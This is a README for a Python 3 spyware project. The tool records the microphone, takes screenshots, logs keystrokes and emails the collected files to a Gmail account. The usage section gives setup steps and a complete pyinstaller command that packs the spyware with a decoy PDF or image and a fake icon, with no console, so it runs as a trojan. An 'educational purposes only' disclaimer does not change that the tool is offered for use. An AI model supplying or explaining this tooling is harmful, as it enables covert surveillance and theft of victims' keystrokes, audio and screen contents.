## spyware
Implementation of spyware in python 3

## Technologies

- Python 3.7

## Features
The main features of this spyware are:
- Recording sound from microphone
- Taking screenshots
- Making logs from keyboard
- Sending reports with all these files on given email (gmail)

The important thing is that you have to pass gmail (@gmail.com) email address (program use their SMTP server) <br>
You should also 'allow insecure apps' in your email settings. <br>


## Usage
The first thing you need to do is run setup.py file and follow the instructions: <br>
```$ python3 setup.py``` <br>
After that spyware is ready to go.<br>
If you want program to behave like trojan, you can pack everything up with pyinstaller. Type: <br>
```pyinstaller ./spyware.py --add-data "<path to fake file (pdf, jpg)>;."  --add-data "./user_info/info.json;." --onefile --noconsole --icon "<path to icon of fake file>"``` <br>
in main dir. After that you'll have standalone spyware, ready to launch.

## Info
Program created for educational purposes only! Spying on someone without their permission is illegal, so I'm not taking the responsibility for anything.

## Future
I'm looking forward to add support for recording from webcam, to make spyware report complete!

## Author

[dszyszek](https://github.com/dszyszek)